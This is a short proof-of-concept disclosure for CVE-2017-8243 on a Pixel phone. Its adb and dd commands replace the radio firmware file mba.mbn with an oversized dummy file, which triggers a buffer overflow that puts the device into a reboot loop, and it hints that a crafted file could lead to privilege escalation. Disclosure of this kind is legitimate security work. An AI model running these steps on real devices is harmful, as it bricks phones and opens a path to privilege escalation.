https://source.android.com/security/bulletin/2017-07-01, cve-2017-8243




The poc of this issue is to create a new firmware file and replace the target firmware in the device.
In the following example, we try to replace :   /firmware/radio/mba.mbn

steps:

1)  dd if=/dev/zero of=2Mfile bs=1M count=2    :  create a file with size = 2M (or any other size larger than SZ_1M)
2)  adb push 2Mfile /data/local/tmp/  :  push the file to device
3)  adb shell mount -o rw,/firmware/radio  : remount /firmware/radio to be writable
4)  adb shell mv /firmware/radio/mba.mbn /firmware/radio/mba.mbn.bak  :  backup the original firmware
5)  adb shell cp /data/local/tmp/2Mfle /firmware/radio/mba.mbn  :  replace the original firmware file with the file we just created

After doing like above, and reboot the device, the device would keep rebooting because the buffer-overflow vuln is triggered when it calls pil_mss_reset_load_mba.
If we meticulouslyã€€design a bad firmware file we may have a chance to get  privilege escalation.

The poc was tested in pixel with fingerprint: google/sailfish/sailfish:7.1.1/NMF26U/3562008:user/release-keys
